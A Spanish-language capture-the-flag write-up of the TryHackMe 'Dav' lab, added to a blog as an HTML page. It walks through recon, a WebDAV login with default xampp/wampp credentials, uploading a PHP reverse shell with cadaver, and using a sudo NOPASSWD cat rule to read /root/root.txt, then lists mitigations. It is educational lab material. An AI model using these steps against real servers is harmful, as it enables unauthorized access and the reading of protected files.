@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<!DOCTYPE html>
+
+<html lang="es">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1" name="viewport"/>
+<title>Maquina Dav TryHackMe | ZsZsec</title>
+<meta content="Resumen Durante el pentest de la máquina Dav se identificó un servidor web Apache en el puerto 80. Mediante enumeración de directorios se detectó un endpoint WebDAV protegido por a..." name="description"/>
+<meta content="#000000" name="theme-color"/>
+<link href="../assets/favicon.svg" rel="icon" type="image/svg+xml"/>
+<link href="../assets/style.css" rel="stylesheet"/>
+</head>
+<body>
+<div class="scanline"></div>
+<header class="site-header">
+<a aria-label="Inicio" class="brand" href="../index.html"><span class="brand-mark">λ</span><span class="brand-text">ZsZsec</span></a>
+<nav aria-label="Navegación principal" class="nav"><a class="nav-link" href="../index.html">Inicio</a><a class="nav-link" href="../sobre-mi.html">Sobre mí</a><a class="nav-link" href="../articulos.html">Artículos</a><a class="nav-link active" href="../writeups.html">Writeups</a></nav>
+</header>
+<main>
+<section class="page-hero compact">
+<p class="eyebrow">TryHackMe</p>
+<h1>Maquina Dav TryHackMe<span>_</span></h1>
+<div class="writeup-meta"><span>webdav / cadaver / sudo</span></div>
+<div class="tag-row"><span class="tag">webdav</span><span class="tag">cadaver</span><span class="tag">sudo</span><span class="tag">cat</span><span class="tag">Nmap</span><span class="tag">web</span><span class="tag">dirsearch</span></div>
+</section>
+<section class="content-shell">
+<article class="markdown-body">
+<h1>Resumen</h1>
+<p>Durante el pentest de la máquina <strong>Dav</strong> se identificó un servidor web Apache en el puerto 80. Mediante enumeración de directorios se detectó un endpoint WebDAV protegido por autenticación. Tras probar credenciales por defecto se obtuvo acceso al espacio WebDAV y con la herramienta <code>cadaver</code> se subió una webshell. Con la shell remota se ejecutaron enumeración y comprobaciones; <code>sudo -l</code> reveló que el usuario <code>www-data</code> podía ejecutar <code>/bin/cat</code> como <strong>cualquier usuario</strong> sin contraseña (<code>NOPASSWD</code>). Aprovechando esto se leyó directamente <code>/root/root.txt</code> y se consiguió la flag de root.</p>
+<p>Este writeup explica con detalle decisión por decisión: por qué se usaron las herramientas, qué outputs importaron, y cómo mitigar las vulnerabilidades encontradas.</p>
+<h2>Alcance y ambiente</h2>
+<ul>
+<li>Máquina: <code>Dav</code> (TryHackMe)</li>
+<li>IP objetivo (en el momento de las pruebas): <code>10.201.28.85</code> (Nmap muestra la IP escaneada)</li>
+<li>Herramientas principales: <code>nmap</code>, <code>dirsearch</code>, <code>cadaver</code>, una reverse shell PHP, y comandos del sistema remoto (<code>sudo -l</code>, <code>/bin/cat</code>).</li>
+<li>Nota de alcance: Todo el trabajo se realizó en el entorno de laboratorio de TryHackMe con fines educativos.</li>
+</ul>
+<h2>Reconocimiento: <code>nmap</code></h2>
+<p>Comando usado:</p>
+<pre><code class="language-bash"># Nmap 7.95 scan initiated Mon Sep 15 16:08:27 2025 as: /usr/lib/nmap/nmap --privileged -sV -sS -Pn -p- -sC --min-rate 5000 -oN nmap.txt 10.201.28.85
+Nmap scan report for 10.201.28.85
+Host is up (0.24s latency).
+Not shown: 65534 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-title: Apache2 Ubuntu Default Page: It works
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Mon Sep 15 16:08:55 2025 -- 1 IP address (1 host up) scanned in 28.35 seconds
+                                                                                                  
+</code></pre>
+<p><strong>Resultado relevante:</strong></p>
+<pre><code class="language-bash">80/tcp open http Apache httpd 2.4.18 ((Ubuntu))
+|_http-title: Apache2 Ubuntu Default Page: It works
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+</code></pre>
+<p><strong>Interpretación</strong>: Solo el servicio HTTP en el puerto 80 está abierto y responde con una página por defecto de Apache. La versión <em>2.4.18</em> indica una instalación relativamente antigua de Apache (en el contexto de Ubuntu), que puede dar pistas sobre configuraciones por defecto o módulos habilitados.</p>
+<p>El resultado de <code>nmap</code> nos dio el primer indicio: había un servicio web — objetivo natural para enumeración HTTP más profunda.</p>
+<h2>Enumeración web: <code>dirsearch</code> y descubrimiento de WebDAV</h2>
+<p>Se realizó un barrido de directorios con <code>dirsearch</code> hacia la URL base. El output esencial fue:</p>
+<pre><code class="language-bash">─(zikuta㉿zikuta)-[~/Desktop/dav]
+└─$ dirsearch -u http://10.201.23.176                                
+/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
+  from pkg_resources import DistributionNotFound, VersionConflict
+
+  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                                                                                  
+ (_||| _) (/_(_|| (_| )                                                                                                                                                                                           
+                                                                                                                                                                                                                  
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
+
+Output File: /home/zikuta/Desktop/dav/reports/http_10.201.23.176/_25-09-15_19-04-02.txt
+
+Target: http://10.201.23.176/
+
+[19:04:02] Starting:                                                               
+[19:06:05] 401 -  460B  - /webdav/                                          
+[19:06:05] 401 -  460B  - /webdav/servlet/webdav/
+[19:06:05] 401 -  460B  - /webdav/index.html
+</code></pre>
+<h3>¿Qué indica esto?</h3>
+<ul>
+<li>El servidor responde <code>401 Unauthorized</code> para <code>/webdav/</code>, lo que apunta a un recurso protegido por autenticación — muy probablemente un servicio WebDAV montado en el servidor.</li>
+<li><code>/webdav/servlet/webdav/</code> sugiere la presencia de un servlet WebDAV (posible implementación sobre Tomcat/servlets o simplemente rutas con esa estructura), aunque la cabecera del servidor era Apache.</li>
+</ul>
+<h3>Decisión de ataque</h3>
+<p>Dado que WebDAV permite (si se configura así) operaciones de escritura/remoto (PUT/DELETE), un recurso WebDAV autenticado es un objetivo excelente: si se descubren credenciales válidas, es posible subir archivos (por ejemplo, una webshell) y ejecutarlos a través del servidor web.</p>
+<h2>Credenciales por defecto y acceso inicial</h2>
+<p>Con la pista de WebDAV protegido, probé credenciales comunes/por defecto: <code>xampp</code> / <code>wampp</code> (credenciales frecuentemente usadas en laboratorios y distribuciones de desarrollo). Estas credenciales funcionaron para autenticar contra <code>/webdav/</code>.</p>
+<p><strong>Nota sobre razonamiento:</strong> En entornos de laboratorio y despliegues con configuración por defecto, es habitual encontrar credenciales débiles o valores por defecto no cambiados — siempre es una verificación válida en una auditoría.</p>
+<h2>Uso de <code>cadaver</code> para interactuar con WebDAV</h2>
+<p><code>cadaver</code> es un cliente interactivo para WebDAV en consola que permite listar, descargar y subir archivos a un endpoint WebDAV.</p>
+<pre><code class="language-bash">(zikuta㉿zikuta)-[~/Desktop/dav]
+└─$ cadaver http://10.201.23.176/webdav
+Authentication required for webdav on server `10.201.23.176':
+Username: wampp
+Password: 
+dav:/webdav/&gt; ls
+Listing collection `/webdav/': succeeded.
+        passwd.dav                            44  Aug 25  2019
+dav:/webdav/&gt; put shelsita.php
+Uploading shelsita.php to `/webdav/shelsita.php':
+Progress: [=============================&gt;] 100.0% of 2587 bytes succeeded.
+dav:/webdav/&gt; 
+</code></pre>
+<h3>¿Qué se hizo?</h3>
+<ol>
+<li>Se autenticó con <code>cadaver</code> contra <code>/webdav</code> y se listó el contenido. Aparecía al menos <code>passwd.dav</code>, lo que confirma el control de ficheros en ese  directorio.</li>
+<li>Se subio un archivo: <code>shelsita.php</code> (una reverse shell  <code>PHP Pentest Monkey</code>, ~2.5KB).</li>
+</ol>
+<p><strong>Riesgo explotado:</strong> la existencia de WebDAV con permisos de escritura combinada con credenciales débiles permitió subir código ejecutable al espacio público del servidor web.</p>
+<h2>Obtención de shell y post-explotación inicial</h2>
+<p>Tras subir la reverse shell se accedió vía HTTP al archivo mientras escuchamos en <code>nc</code>.</p>
+<p>Con la sesión remota como <code>www-data</code> (usuario típico del servidor web), se hizo enumeración local y se ejecutaron comprobaciones de sudo:</p>
+<pre><code class="language-bash">www-data@ubuntu:/home/merlin$ sudo -l                                                                                                                                                                             
+sudo -l                                                                                                                                                                                                           
+Matching Defaults entries for www-data on ubuntu:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on ubuntu:
+    (ALL) NOPASSWD: /bin/cat
+</code></pre>
+<h3>Interpretación del <code>sudo -l</code></h3>
+<ul>
+<li><code>www-data</code> puede ejecutar <code>/bin/cat</code> como <strong>cualquier usuario</strong> (ALL) sin necesidad de contraseña. Esto es un hallazgo crítico: potencia de lectura sobre cualquier fichero del sistema sin restricciones.</li>
+</ul>
+<h2>Escalada a root (abuso de sudo NOPASSWD para /bin/cat)</h2>
+<p>Con la capacidad de ejecutar <code>/bin/cat</code> como root (o como cualquier usuario) sin contraseña, se puede <strong>leer</strong> directamente ficheros sensibles, incluido <code>/root/root.txt</code>.</p>
+<p>Comando ejecutado:</p>
+<pre><code class="language-bash">www-data@ubuntu:/home/merlin$ sudo /bin/cat /root/root.txt
+sudo /bin/cat /root/root.txt
+</code></pre>
+<p>Y con eso se obtuvo la flag de root.</p>
+<h3>¿Por qué esto funciona?</h3>
+<p>Sudo con <code>NOPASSWD</code> no requiere contraseña para ejecutar el binario autorizado. Si se autoriza <code>/bin/cat</code> sobre <em>ALL</em> usuarios, entonces con <code>sudo /bin/cat /root/archivo</code> se leen ficheros que normalmente sólo root puede leer. Aunque no da una shell root interactiva, permite extraer información crítica y, potencialmente, otros secretos que permitan una escalada adicional.</p>
+<h2>Evidencia y trazas relevantes</h2>
+<ul>
+<li><code>nmap</code> mostrando Apache/2.4.18</li>
+<li><code>dirsearch</code> mostrando <code>401</code> en <code>/webdav/</code></li>
+<li><code>cadaver</code> mostrando <code>Listing collection</code> y subida de <code>shelsita.php</code></li>
+<li><code>sudo -l</code> output mostrando <code>User www-data may run the following commands on ubuntu: (ALL) NOPASSWD: /bin/cat</code></li>
+<li><code>sudo /bin/cat /root/root.txt</code> lectura de <code>root.txt</code></li>
+</ul>
+<h2>Recomendaciones de mitigación</h2>
+<ol>
+<li><strong>Eliminar credenciales por defecto y usar contraseñas robustas</strong>: nunca dejar cuentas <code>wampp/xampp</code> o similares con contraseñas conocidas. Reemplazar con autenticación fuerte o integrar con un gestor de secretos.</li>
+<li><strong>Restringir acceso WebDAV</strong>: si no se requiere, deshabilitar WebDAV. Si es necesario, restringir las operaciones de escritura por IP o por usuario, y validar uploads para bloquear ficheros ejecutables.</li>
+<li><strong>Configuración de</strong> <code>**sudo**</code> <strong>mínima</strong>: evitar reglas <code>NOPASSWD</code> para comandos que permiten leer o ejecutar código. Si es estrictamente necesario permitir ciertos comandos, restringir su uso a rutas y parámetros concretos (ej. no <code>ALL</code> ni comandos como <code>cat</code> sin control).</li>
+<li><strong>Seguridad en el árbol web</strong>: configurar el servidor para que no ejecute scripts subidos en directorios de upload, o separar directorios de upload de los que se ejecutan como código.</li>
+<li><strong>Auditoría de logs</strong>: revisar logs de acceso de Apache y del sistema para detectar subidas no autorizadas o actividad sospechosa.</li>
+<li><strong>Principio de menor privilegio</strong>: <code>www-data</code> no debería tener permisos especiales en <code>sudo</code>.</li>
+</ol>
+<h2>Conclusiones y lecciones aprendidas</h2>
+<ul>
+<li>Un servicio relativamente sencillo (WebDAV) combinado con credenciales por defecto resulta en un acceso inicial trivial — el vector clásico de muchos incidentes reales.</li>
+<li>Las reglas de <code>sudo</code> mal configuradas (especialmente <code>NOPASSWD</code> sobre binarios que permiten leer o ejecutar contenido arbitrario) son una escalada de privilegios de bajo esfuerzo y alto impacto.</li>
+<li>En auditorías, no subestimar recursos “de desarrollo” como <code>xampp</code>/<code>wampp</code> que pueden permanecer activos en entornos productivos o de prueba.</li>
+</ul>
+</article>
+</section>
+</main>
+<footer class="site-footer"><span>ZsZsec // Zikuta</span><span class="footer-dot">•</span><span>Offensive Security Notes</span></footer>
+</body>
+</html>
